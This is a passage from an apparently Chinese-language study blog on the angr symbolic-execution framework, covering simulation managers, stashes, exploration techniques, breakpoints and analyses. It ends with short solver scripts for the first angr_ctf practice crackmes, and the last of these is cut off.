<p>Similar to the history, the callstack is also a linked list of nodes, but there are no provided iterators over the contents of the nodes - instead you can directly iterate over <code>state.callstack</code> to get the callstack frames for each of the active frames, in order from most recent to oldest. If you just want the topmost frame, this is <code>state.callstack</code>.</p>
<ul>
<li><code>callstack.func_addr</code> is the address of the function currently being executed</li>
<li><code>callstack.call_site_addr</code> is the address of the basic block which called the current function</li>
<li><code>callstack.stack_ptr</code> is the value of the stack pointer from the beginning of the current function</li>
<li><code>callstack.ret_addr</code> is the location that the current function will return to if it returns</li>
</ul>
<h4 id="I-x2F-O"><a href="#I-x2F-O" class="headerlink" title="I&#x2F;O"></a>I&#x2F;O</h4><p><a href="https://docs.angr.io/en/latest/advanced-topics/file_system.html#working-with-file-system-sockets-and-pipes">Working with File System, Sockets, and Pipes</a></p>
<h4 id="Copying-and-Merging"><a href="#Copying-and-Merging" class="headerlink" title="Copying and Merging"></a>Copying and Merging</h4><p>A state supports very fast copies, so that you can explore different possibilities:</p>
<pre><code class="python">&gt;&gt;&gt; proj = angr.Project(&#39;/bin/true&#39;)
&gt;&gt;&gt; s = proj.factory.blank_state()
&gt;&gt;&gt; s1 = s.copy()
&gt;&gt;&gt; s2 = s.copy()

&gt;&gt;&gt; s1.mem[0x1000].uint32_t = 0x41414141
&gt;&gt;&gt; s2.mem[0x1000].uint32_t = 0x42424242
</code></pre>
<p>States can also be merged together.</p>
<pre><code class="python"># merge will return a tuple. the first element is the merged state
# the second element is a symbolic variable describing a state flag
# the third element is a boolean describing whether any merging was done
&gt;&gt;&gt; (s_merged, m, anything_merged) = s1.merge(s2)

# this is now an expression that can resolve to &quot;AAAA&quot; *or* &quot;BBBB&quot;
&gt;&gt;&gt; aaaa_or_bbbb = s_merged.mem[0x1000].uint32_t
print(aaaa_or_bbbb)
# 打印该地址可能的数值集合
# &lt;uint32_t &lt;BV32 (if state_merge_0_0_16 == 0x1 then 66 else (if state_merge_0_0_16 == 0x0 then 65 else 0)) .. (if state_merge_0_0_16 == 0x1 then 66 else (if state_merge_0_0_16 == 0x0 then 65 else 0)) .. (if state_merge_0_0_16 == 0x1 then 66 else (if state_merge_0_0_16 == 0x0 then 65 else 0)) .. (if state_merge_0_0_16 == 0x1 then 66 else (if state_merge_0_0_16 == 0x0 then 65 else 0))&gt; at 0x1000&gt;
</code></pre>
<h3 id="Simulation-Managers"><a href="#Simulation-Managers" class="headerlink" title="Simulation Managers"></a>Simulation Managers</h3><p>描述：</p>
<pre><code>Simulation managers let you wrangle multiple states in a slick way. States are organized into “stashes”, which you can step forward, filter, merge, and move around as you wish.
</code></pre>
<h4 id="Stepping"><a href="#Stepping" class="headerlink" title="Stepping"></a>Stepping</h4><p><code>.step()</code>： 前进一个basic block</p>
<p><code>.run()</code>：执行到所有deadended，并且获得所有deadended states（例如到达exit syscall，此时该state会被从<code>active stash</code>中移除并放入<code>deadended states</code>）</p>
<h4 id="Stash-Management"><a href="#Stash-Management" class="headerlink" title="Stash Management"></a>Stash Management</h4><p><code>.move()</code>：<code>from_stash</code> <code>to_stash</code> <code>filter_func (optional, default:everything)</code></p>
<pre><code class="python"># eg.检查所有执行路径已终止（deadended）的状态，查找其中在程序的标准输出中打印了&#39;Welcome&#39;的状态，并将这些状态移动到一个名为&#39;authenticated&#39;的新stash，以便进一步分析或单独处理。
simgr.move(from_stash=&#39;deadended&#39;, to_stash=&#39;authenticated&#39;, filter_func=lambda s: b&#39;Welcome&#39; in s.posix.dumps(1))
&gt;&gt;&gt; simgr
&lt;SimulationManager with 2 authenticated, 1 deadended&gt;
</code></pre>
<p>stash的类型为list，可以通过如下方式访问：</p>
<pre><code class="python">for s in simgr.deadended + simgr.authenticated:
...     print(hex(s.addr))
0x1000030
0x1000078
0x1000078

&gt;&gt;&gt; simgr.one_deadended
&lt;SimState @ 0x1000030&gt;
&gt;&gt;&gt; simgr.mp_authenticated
MP([&lt;SimState @ 0x1000078&gt;, &lt;SimState @ 0x1000078&gt;])
&gt;&gt;&gt; simgr.mp_authenticated.posix.dumps(0)
MP([&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;,
    &#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80\x80@\x80@\x00&#39;])
</code></pre>
<p>所以link呢</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231024140622184-16981317543812.png" alt="image-20231024140622184"></p>
<h4 id="Stash-types"><a href="#Stash-types" class="headerlink" title="Stash types"></a>Stash types</h4><table>
<thead>
<tr>
<th>Stash</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>active</td>
<td>This stash contains the states that will be stepped by default, unless an alternate stash is specified.</td>
</tr>
<tr>
<td>deadended</td>
<td>A state goes to the deadended stash when it cannot continue the execution for some reason, including no more valid instructions, unsat state of all of its successors, or an invalid instruction pointer.</td>
</tr>
<tr>
<td>pruned</td>
<td>When using <code>LAZY_SOLVES</code>, states are not checked for satisfiability unless absolutely necessary. When a state is found to be unsat in the presence of <code>LAZY_SOLVES</code>, the state hierarchy is traversed to identify when, in its history, it initially became unsat. All states that are descendants of that point (which will also be unsat, since a state cannot become un-unsat) are pruned and put in this stash.</td>
</tr>
<tr>
<td>unconstrained</td>
<td>If the <code>save_unconstrained</code> option is provided to the SimulationManager constructor, states that are determined to be unconstrained (i.e., with the instruction pointer controlled by user data or some other source of symbolic data) are placed here.</td>
</tr>
<tr>
<td>unsat</td>
<td>If the <code>save_unsat</code> option is provided to the SimulationManager constructor, states that are determined to be unsatisfiable (i.e., they have constraints that are contradictory, like the input having to be both “AAAA” and “BBBB” at the same time) are placed here.</td>
</tr>
<tr>
<td>errored</td>
<td>If, during execution, an error is raised, then the state will be wrapped in an <code>ErrorRecord</code> object, which contains the state and the error it raised, and then the record will be inserted into <code>errored</code>.                launch a debug shell at the site of the error with <code>record.debug()</code>.</td>
</tr>
</tbody></table>
<h3 id="Exploration"><a href="#Exploration" class="headerlink" title="Exploration"></a>Exploration</h3><p><code>.explore()</code>：<code>find</code> argument(指令的结束地址或结束地址列表,或函数根据某种标准的返回状态)</p>
<p>当满足后，放入<code>found</code> stash，然后结束符号执行，可以同样声明<code>avoid</code> condition（格式与<code>find</code>相同）</p>
<p><code>num_find</code>指定return前找到多少数量的<code>find</code>（default &#x3D; 1，如果所有active stash的state被全部执行则同样return）</p>
<p>eg.</p>
<pre><code class="python">proj = angr.Project(&#39;examples/CSCI-4968-MBE/challenges/crackme0x00a/crackme0x00a&#39;)
simgr = proj.factory.simgr()
simgr.explore(find=lambda s: b&quot;Congrats&quot; in s.posix.dumps(1))
s = simgr.found[0]
print(s.posix.dumps(1))
# Enter password: Congrats!
flag = s.posix.dumps(0)
print(flag)
# g00dJ0B!
</code></pre>
<p>其他样例：<a href="https://docs.angr.io/en/latest/examples.html#angr-examples">angr examples - angr documentation</a></p>
<h3 id="Exploration-Techniques"><a href="#Exploration-Techniques" class="headerlink" title="Exploration Techniques"></a>Exploration Techniques</h3><p>angr ships with several pieces of canned functionality that let you customize the behavior of a simulation manager, called <em>exploration techniques</em>. The archetypical example of why you would want an exploration technique is to modify the pattern in which the state space of the program is explored - the default “step everything at once” strategy is effectively breadth-first search, but with an exploration technique you could implement, for example, depth-first search. However, the instrumentation power of these techniques is much more flexible than that - you can totally alter the behavior of angr’s stepping process. Writing your own exploration techniques will be covered in a later chapter.</p>
<p>To use an exploration technique, call <code>simgr.use_technique(tech)</code>, where tech is an instance of an ExplorationTechnique subclass. angr’s built-in exploration techniques can be found under <code>angr.exploration_techniques</code>.</p>
<p>Here’s a quick overview of some of the built-in ones:</p>
<ul>
<li><em>DFS</em>: Depth first search, as mentioned earlier. Keeps only one state active at once, putting the rest in the <code>deferred</code> stash until it deadends or errors.</li>
<li><em>Explorer</em>: This technique implements the <code>.explore()</code> functionality, allowing you to search for and avoid addresses.</li>
<li><em>LengthLimiter</em>: Puts a cap on the maximum length of the path a state goes through.</li>
<li><em>LoopSeer</em>: Uses a reasonable approximation of loop counting to discard states that appear to be going through a loop too many times, putting them in a <code>spinning</code> stash and pulling them out again if we run out of otherwise viable states.</li>
<li><em>ManualMergepoint</em>: Marks an address in the program as a merge point, so states that reach that address will be briefly held, and any other states that reach that same point within a timeout will be merged together.</li>
<li><em>MemoryWatcher</em>: Monitors how much memory is free&#x2F;available on the system between simgr steps and stops exploration if it gets too low.</li>
<li><em>Oppologist</em>: The “operation apologist” is an especially fun gadget - if this technique is enabled and angr encounters an unsupported instruction, for example a bizzare and foreign floating point SIMD op, it will concretize all the inputs to that instruction and emulate the single instruction using the unicorn engine, allowing execution to continue.</li>
<li><em>Spiller</em>: When there are too many states active, this technique can dump some of them to disk in order to keep memory consumption low.</li>
<li><em>Threading</em>: Adds thread-level parallelism to the stepping process. This doesn’t help much because of Python’s global interpreter locks, but if you have a program whose analysis spends a lot of time in angr’s native-code dependencies (unicorn, z3, libvex) you can seem some gains.</li>
<li><em>Tracer</em>: An exploration technique that causes execution to follow a dynamic trace recorded from some other source. The <a href="https://github.com/angr/tracer">dynamic tracer repository</a> has some tools to generate those traces.</li>
<li><em>Veritesting</em>: An implementation of a [CMU paper](<a href="https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos">https://users.ece.cmu.edu/~dbrumley/pdf/Avgerinos</a> et al._2014_Enhancing Symbolic Execution with Veritesting.pdf) on automatically identifying useful merge points. This is so useful, you can enable it automatically with <code>veritesting=True</code> in the SimulationManager constructor! Note that it frequenly doesn’t play nice with other techniques due to the invasive way it implements static symbolic execution.</li>
</ul>
<p>Look at the API documentation for the <a href="https://docs.angr.io/en/latest/api.html#angr.sim_manager.SimulationManager"><code>SimulationManager</code></a> and <a href="https://docs.angr.io/en/latest/api.html#angr.exploration_techniques.ExplorationTechnique"><code>ExplorationTechnique</code></a> classes for more information.</p>
<h3 id="Simulation-and-Instrumentation"><a href="#Simulation-and-Instrumentation" class="headerlink" title="Simulation and Instrumentation"></a>Simulation and Instrumentation</h3><table>
<thead>
<tr>
<th>Attribute</th>
<th>Guard Condition</th>
<th>Instruction Pointer</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>successors</code></td>
<td>True (can be symbolic, but constrained to True)</td>
<td>Can be symbolic (but 256 solutions or less; see <code>unconstrained_successors</code>).</td>
<td>A normal, satisfiable successor state to the state processed by the engine. The instruction pointer of this state may be symbolic (i.e., a computed jump based on user input), so the state might actually represent <em>several</em> potential continuations of execution going forward.</td>
</tr>
<tr>
<td><code>unsat_successors</code></td>
<td>False (can be symbolic, but constrained to False).</td>
<td>Can be symbolic.</td>
<td>Unsatisfiable successors. These are successors whose guard conditions can only be false (i.e., jumps that cannot be taken, or the default branch of jumps that <em>must</em> be taken).</td>
</tr>
<tr>
<td><code>flat_successors</code></td>
<td>True (can be symbolic, but constrained to True).</td>
<td>Concrete value.</td>
<td>As noted above, states in the <code>successors</code> list can have symbolic instruction pointers. This is rather confusing, as elsewhere in the code (i.e., in <code>SimEngineVEX.process</code>, when it’s time to step that state forward), we make assumptions that a single program state only represents the execution of a single spot in the code. To alleviate this, when we encounter states in <code>successors</code> with symbolic instruction pointers, we compute all possible concrete solutions (up to an arbitrary threshold of 256) for them, and make a copy of the state for each such solution. We call this process “flattening”. These <code>flat_successors</code> are states, each of which has a different, concrete instruction pointer. For example, if the instruction pointer of a state in <code>successors</code> was <code>X+5</code>, where <code>X</code> had constraints of <code>X &gt; 0x800000</code> and <code>X &lt;= 0x800010</code>, we would flatten it into 16 different <code>flat_successors</code> states, one with an instruction pointer of <code>0x800006</code>, one with <code>0x800007</code>, and so on until <code>0x800015</code>.</td>
</tr>
<tr>
<td><code>unconstrained_successors</code></td>
<td>True (can be symbolic, but constrained to True).</td>
<td>Symbolic (with more than 256 solutions).</td>
<td>During the flattening procedure described above, if it turns out that there are more than 256 possible solutions for the instruction pointer, we assume that the instruction pointer has been overwritten with unconstrained data (i.e., a stack overflow with user data). <em>This assumption is not sound in general</em>. Such states are placed in <code>unconstrained_successors</code> and not in <code>successors</code>.</td>
</tr>
<tr>
<td><code>all_successors</code></td>
<td>Anything</td>
<td>Can be symbolic.</td>
<td>This is <code>successors + unsat_successors + unconstrained_successors</code>.</td>
</tr>
</tbody></table>
<h4 id="Breakpoints"><a href="#Breakpoints" class="headerlink" title="Breakpoints"></a>Breakpoints</h4><pre><code class="python">&gt;&gt;&gt; import angr
&gt;&gt;&gt; b = angr.Project(&#39;examples/fauxware/fauxware&#39;)

# get our state
&gt;&gt;&gt; s = b.factory.entry_state()

# add a breakpoint. This breakpoint will drop into ipdb right before a memory write happens.
&gt;&gt;&gt; s.inspect.b(&#39;mem_write&#39;)

# on the other hand, we can have a breakpoint trigger right *after* a memory write happens.
# we can also have a callback function run instead of opening ipdb.
&gt;&gt;&gt; def debug_func(state):
...     print(&quot;State %s is about to do a memory write!&quot;)

&gt;&gt;&gt; s.inspect.b(&#39;mem_write&#39;, when=angr.BP_AFTER, action=debug_func)

# or, you can have it drop you in an embedded IPython!
&gt;&gt;&gt; s.inspect.b(&#39;mem_write&#39;, when=angr.BP_AFTER, action=angr.BP_IPYTHON)
</code></pre>
<table>
<thead>
<tr>
<th>Event type</th>
<th>Event meaning</th>
</tr>
</thead>
<tbody><tr>
<td>mem_read</td>
<td>Memory is being read.</td>
</tr>
<tr>
<td>mem_write</td>
<td>Memory is being written.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>A symbolic memory access is being resolved.</td>
</tr>
<tr>
<td>reg_read</td>
<td>A register is being read.</td>
</tr>
<tr>
<td>reg_write</td>
<td>A register is being written.</td>
</tr>
<tr>
<td>tmp_read</td>
<td>A temp is being read.</td>
</tr>
<tr>
<td>tmp_write</td>
<td>A temp is being written.</td>
</tr>
<tr>
<td>expr</td>
<td>An expression is being created (i.e., a result of an arithmetic operation or a constant in the IR).</td>
</tr>
<tr>
<td>statement</td>
<td>An IR statement is being translated.</td>
</tr>
<tr>
<td>instruction</td>
<td>A new (native) instruction is being translated.</td>
</tr>
<tr>
<td>irsb</td>
<td>A new basic block is being translated.</td>
</tr>
<tr>
<td>constraints</td>
<td>New constraints are being added to the state.</td>
</tr>
<tr>
<td>exit</td>
<td>A successor is being generated from execution.</td>
</tr>
<tr>
<td>fork</td>
<td>A symbolic execution state has forked into multiple states.</td>
</tr>
<tr>
<td>symbolic_variable</td>
<td>A new symbolic variable is being created.</td>
</tr>
<tr>
<td>call</td>
<td>A call instruction is hit.</td>
</tr>
<tr>
<td>return</td>
<td>A ret instruction is hit.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>A simprocedure (or syscall) is executed.</td>
</tr>
<tr>
<td>dirty</td>
<td>A dirty IR callback is executed.</td>
</tr>
<tr>
<td>syscall</td>
<td>A syscall is executed (called in addition to the simprocedure event).</td>
</tr>
<tr>
<td>engine_process</td>
<td>A SimEngine is about to process some code.</td>
</tr>
</tbody></table>
<p>These events expose different attributes:</p>
<table>
<thead>
<tr>
<th>Event type</th>
<th>Attribute name</th>
<th>Attribute availability</th>
<th>Attribute meaning</th>
</tr>
</thead>
<tbody><tr>
<td>mem_read</td>
<td>mem_read_address</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address at which memory is being read.</td>
</tr>
<tr>
<td>mem_read</td>
<td>mem_read_expr</td>
<td>BP_AFTER</td>
<td>The expression at that address.</td>
</tr>
<tr>
<td>mem_read</td>
<td>mem_read_length</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The length of the memory read.</td>
</tr>
<tr>
<td>mem_read</td>
<td>mem_read_condition</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The condition of the memory read.</td>
</tr>
<tr>
<td>mem_write</td>
<td>mem_write_address</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address at which memory is being written.</td>
</tr>
<tr>
<td>mem_write</td>
<td>mem_write_length</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The length of the memory write.</td>
</tr>
<tr>
<td>mem_write</td>
<td>mem_write_expr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression that is being written.</td>
</tr>
<tr>
<td>mem_write</td>
<td>mem_write_condition</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The condition of the memory write.</td>
</tr>
<tr>
<td>reg_read</td>
<td>reg_read_offset</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The offset of the register being read.</td>
</tr>
<tr>
<td>reg_read</td>
<td>reg_read_length</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The length of the register read.</td>
</tr>
<tr>
<td>reg_read</td>
<td>reg_read_expr</td>
<td>BP_AFTER</td>
<td>The expression in the register.</td>
</tr>
<tr>
<td>reg_read</td>
<td>reg_read_condition</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The condition of the register read.</td>
</tr>
<tr>
<td>reg_write</td>
<td>reg_write_offset</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The offset of the register being written.</td>
</tr>
<tr>
<td>reg_write</td>
<td>reg_write_length</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The length of the register write.</td>
</tr>
<tr>
<td>reg_write</td>
<td>reg_write_expr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression that is being written.</td>
</tr>
<tr>
<td>reg_write</td>
<td>reg_write_condition</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The condition of the register write.</td>
</tr>
<tr>
<td>tmp_read</td>
<td>tmp_read_num</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The number of the temp being read.</td>
</tr>
<tr>
<td>tmp_read</td>
<td>tmp_read_expr</td>
<td>BP_AFTER</td>
<td>The expression of the temp.</td>
</tr>
<tr>
<td>tmp_write</td>
<td>tmp_write_num</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The number of the temp written.</td>
</tr>
<tr>
<td>tmp_write</td>
<td>tmp_write_expr</td>
<td>BP_AFTER</td>
<td>The expression written to the temp.</td>
</tr>
<tr>
<td>expr</td>
<td>expr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The IR expression.</td>
</tr>
<tr>
<td>expr</td>
<td>expr_result</td>
<td>BP_AFTER</td>
<td>The value (e.g. AST) which the expression was evaluated to.</td>
</tr>
<tr>
<td>statement</td>
<td>statement</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The index of the IR statement (in the IR basic block).</td>
</tr>
<tr>
<td>instruction</td>
<td>instruction</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address of the native instruction.</td>
</tr>
<tr>
<td>irsb</td>
<td>address</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address of the basic block.</td>
</tr>
<tr>
<td>constraints</td>
<td>added_constraints</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The list of constraint expressions being added.</td>
</tr>
<tr>
<td>call</td>
<td>function_address</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The name of the function being called.</td>
</tr>
<tr>
<td>exit</td>
<td>exit_target</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression representing the target of a SimExit.</td>
</tr>
<tr>
<td>exit</td>
<td>exit_guard</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression representing the guard of a SimExit.</td>
</tr>
<tr>
<td>exit</td>
<td>exit_jumpkind</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The expression representing the kind of SimExit.</td>
</tr>
<tr>
<td>symbolic_variable</td>
<td>symbolic_name</td>
<td>BP_AFTER</td>
<td>The name of the symbolic variable being created. The solver engine might modify this name (by appending a unique ID and length). Check the symbolic_expr for the final symbolic expression.</td>
</tr>
<tr>
<td>symbolic_variable</td>
<td>symbolic_size</td>
<td>BP_AFTER</td>
<td>The size of the symbolic variable being created.</td>
</tr>
<tr>
<td>symbolic_variable</td>
<td>symbolic_expr</td>
<td>BP_AFTER</td>
<td>The expression representing the new symbolic variable.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_strategy</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimConcretizationStrategy being used to resolve the address. This can be modified by the breakpoint handler to change the strategy that will be applied. If your breakpoint handler sets this to None, this strategy will be skipped.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_action</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimAction object being used to record the memory action.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_memory</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimMemory object on which the action was taken.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_expr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The AST representing the memory index being resolved. The breakpoint handler can modify this to affect the address being resolved.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_add_constraints</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>Whether or not constraints should&#x2F;will be added for this read.</td>
</tr>
<tr>
<td>address_concretization</td>
<td>address_concretization_result</td>
<td>BP_AFTER</td>
<td>The list of resolved memory addresses (integers). The breakpoint handler can overwrite these to effect a different resolution result.</td>
</tr>
<tr>
<td>syscall</td>
<td>syscall_name</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The name of the system call.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>simprocedure_name</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The name of the simprocedure.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>simprocedure_addr</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address of the simprocedure.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>simprocedure_result</td>
<td>BP_AFTER</td>
<td>The return value of the simprocedure. You can also <em>override</em> it in BP_BEFORE, which will cause the actual simprocedure to be skipped and for your return value to be used instead.</td>
</tr>
<tr>
<td>simprocedure</td>
<td>simprocedure</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The actual SimProcedure object.</td>
</tr>
<tr>
<td>dirty</td>
<td>dirty_name</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The name of the dirty call.</td>
</tr>
<tr>
<td>dirty</td>
<td>dirty_handler</td>
<td>BP_BEFORE</td>
<td>The function that will be run to handle the dirty call. You can override this.</td>
</tr>
<tr>
<td>dirty</td>
<td>dirty_args</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The address of the dirty.</td>
</tr>
<tr>
<td>dirty</td>
<td>dirty_result</td>
<td>BP_AFTER</td>
<td>The return value of the dirty call. You can also <em>override</em> it in BP_BEFORE, which will cause the actual dirty call to be skipped and for your return value to be used instead.</td>
</tr>
<tr>
<td>engine_process</td>
<td>sim_engine</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimEngine that is processing.</td>
</tr>
<tr>
<td>engine_process</td>
<td>successors</td>
<td>BP_BEFORE or BP_AFTER</td>
<td>The SimSuccessors object defining the result of the engine.</td>
</tr>
</tbody></table>
<p>eg. 每当程序状态<code>s</code>执行内存读取时，<code>angr</code>都会在读取完成后立即调用<code>track_reads</code>，打印出读取的值和发生读取的内存地址。</p>
<pre><code class="python">&gt;&gt;&gt; def track_reads(state):
...     print(&#39;Read&#39;, state.inspect.mem_read_expr, &#39;from&#39;, state.inspect.mem_read_address)
...
&gt;&gt;&gt; s.inspect.b(&#39;mem_read&#39;, when=angr.BP_AFTER, action=track_reads)
</code></pre>
<pre><code class="python"># This will break before a memory write if 0x1000 is a possible value of its target expression
&gt;&gt;&gt; s.inspect.b(&#39;mem_write&#39;, mem_write_address=0x1000)

# This will break before a memory write if 0x1000 is the *only* value of its target expression
&gt;&gt;&gt; s.inspect.b(&#39;mem_write&#39;, mem_write_address=0x1000, mem_write_address_unique=True)

# This will break after instruction 0x8000, but only 0x1000 is a possible value of the last expression that was read from memory
&gt;&gt;&gt; s.inspect.b(&#39;instruction&#39;, when=angr.BP_AFTER, instruction=0x8000, mem_read_expr=0x1000)
</code></pre>
<p>声明函数作为condition</p>
<pre><code class="python"># this is a complex condition that could do anything! In this case, it makes sure that RAX is 0x41414141 and
# that the basic block starting at 0x8004 was executed sometime in this path&#39;s history
&gt;&gt;&gt; def cond(state):
...     return state.eval(state.regs.rax, cast_to=str) == &#39;AAAA&#39; and 0x8004 in state.inspect.backtrace

&gt;&gt;&gt; s.inspect.b(&#39;mem_write&#39;, condition=cond)
</code></pre>
<h5 id="Caution-about-mem-read-breakpoint"><a href="#Caution-about-mem-read-breakpoint" class="headerlink" title="Caution about mem_read breakpoint"></a>Caution about <code>mem_read</code> breakpoint</h5><p>The <code>mem_read</code> breakpoint gets triggered anytime there are memory reads by either the executing program or the binary analysis. If you are using breakpoint on <code>mem_read</code> and also using <code>state.mem</code> to load data from memory addresses, then know that the breakpoint will be fired as you are technically reading memory.</p>
<p>So if you want to load data from memory and not trigger any <code>mem_read</code> breakpoint you have had set up, then use <code>state.memory.load</code> with the keyword arguments <code>disable_actions=True</code> and <code>inspect=False</code>.</p>
<p>This is also true for <code>state.find</code> and you can use the same keyword arguments to prevent <code>mem_read</code> breakpoints from firing.</p>
<h3 id="Analyses-1"><a href="#Analyses-1" class="headerlink" title="Analyses"></a>Analyses</h3><p><a href="https://docs.angr.io/en/latest/extending-angr/analysis_writing.html#writing-analyses">Writing Analyses - angr documentation</a></p>
<p>the idea is that all the analyses appear under <code>project.analyses</code> (for example, <code>project.analyses.CFGFast()</code>) and can be called as functions, returning analysis result instances.</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>CFGFast</td>
<td>Constructs a fast <em>Control Flow Graph</em> of the program</td>
</tr>
<tr>
<td>CFGEmulated</td>
<td>Constructs an accurate <em>Control Flow Graph</em> of the program</td>
</tr>
<tr>
<td>VFG</td>
<td>Performs VSA on every function of the program, creating a <em>Value Flow Graph</em> and detecting stack variables</td>
</tr>
<tr>
<td>DDG</td>
<td>Calculates a <em>Data Dependency Graph</em>, allowing one to determine what statements a given value depends on</td>
</tr>
<tr>
<td>BackwardSlice</td>
<td>Computes a <em>Backward Slice</em> of a program with respect to a certain target</td>
</tr>
<tr>
<td>Identifier</td>
<td>Identifies common library functions in CGC binaries</td>
</tr>
<tr>
<td>More!</td>
<td>angr has quite a few analyses, most of which work! If you’d like to know how to use one, please submit an issue requesting documentation.</td>
</tr>
</tbody></table>
<h4 id="Resilience"><a href="#Resilience" class="headerlink" title="Resilience"></a>Resilience</h4><p>Analyses can be written to be resilient, and catch and log basically any error. These errors, depending on how they’re caught, are logged to the <code>errors</code> or <code>named_errors</code> attribute of the analysis. However, you might want to run an analysis in “fail fast” mode, so that errors are not handled. To do this, the argument <code>fail_fast=True</code> can be passed into the analysis constructor.</p>
<h3 id="Symbolic-Execution"><a href="#Symbolic-Execution" class="headerlink" title="Symbolic Execution"></a>Symbolic Execution</h3><h6 id="为什么这里是todo…"><a href="#为什么这里是todo…" class="headerlink" title="为什么这里是todo…"></a>为什么这里是todo…</h6><p><a href="https://docs.angr.io/en/latest/core-concepts/symbolic.html">Symbolic Execution - angr documentation</a></p>
<h3 id="angr-ctf"><a href="#angr-ctf" class="headerlink" title="angr_ctf"></a>angr_ctf</h3><h6 id="官方给的样例，文档里还有很多真实ctf比赛的例题orz，初探就做到这里吧"><a href="#官方给的样例，文档里还有很多真实ctf比赛的例题orz，初探就做到这里吧" class="headerlink" title="官方给的样例，文档里还有很多真实ctf比赛的例题orz，初探就做到这里吧"></a>官方给的样例，文档里还有很多真实ctf比赛的例题orz，初探就做到这里吧</h6><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>添加环境变量：</p>
<pre><code>export C_INCLUDE_PATH=/usr/include/x86_64-linux-gnu
</code></pre>
<p>支持编译32位程序包：</p>
<pre><code>sudo apt-get install libc6-dev-i386
</code></pre>
<p>生成可执行程序</p>
<pre><code>python3 generate.py [seed] [output_file]
</code></pre>
<h4 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h4><p>直接找对应标准输出的输入即可</p>
<pre><code class="python">import angr
proj = angr.Project(&#39;./angr&#39;, auto_load_libs=False)
simgr = proj.factory.simgr()
simgr.explore(find=lambda s: b&quot;Good Job.&quot; in s.posix.dumps(1))
s = simgr.found[0]
flag = s.posix.dumps(0)
print(flag)
</code></pre>
<h4 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h4><p>main函数的节点过多</p>
<p><img src="/2023/10/24/angr%E5%88%9D%E6%8E%A2/image-20231024151111618-16981317398901.png" alt="image-20231024151111618"></p>
<p>可以看到<code>avoid_me</code>函数被大量调用</p>
<p>这里需要让angr走到<code>avoid_me</code>函数后就剪枝</p>
<p>可以使用函数传入所有需要avoid的状态</p>
<pre><code class="python">import angr
proj = angr.Project(&#39;./angr&#39;, auto_load_libs=False)
simgr = proj.factory.simgr()
def should_avoid(state):
    # 检查输出是否包含&quot;Try again&quot;
    if b&quot;Try again&quot; in state.posix.dumps(1):
        return True
    # 检查当前地址是否是我们想要避免的地址
    if state.addr == 0x8049243:
        return True
    # 如果以上条件都不满足，那么我们不避免这个状态
    return False
    
simgr.explore(find = lambda s1: b&quot;Good Job.&quot; in s1.posix.dumps(1), avoid = should_avoid)

s = simgr.found[0]
flag = s.posix.dumps(0)
print(flag)
</code></pre>
<h4 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h4><p>和上面一样</p>
<pre><code class="python">import angr
proj = angr.Project(&#39;./angr&#39;, auto_load_libs=False)
simgr = proj.factory.simgr()
def should_avoid(state):
    if b&quot;Try again.&quot; in state.posix.dumps(1):
        return True
    return False
    
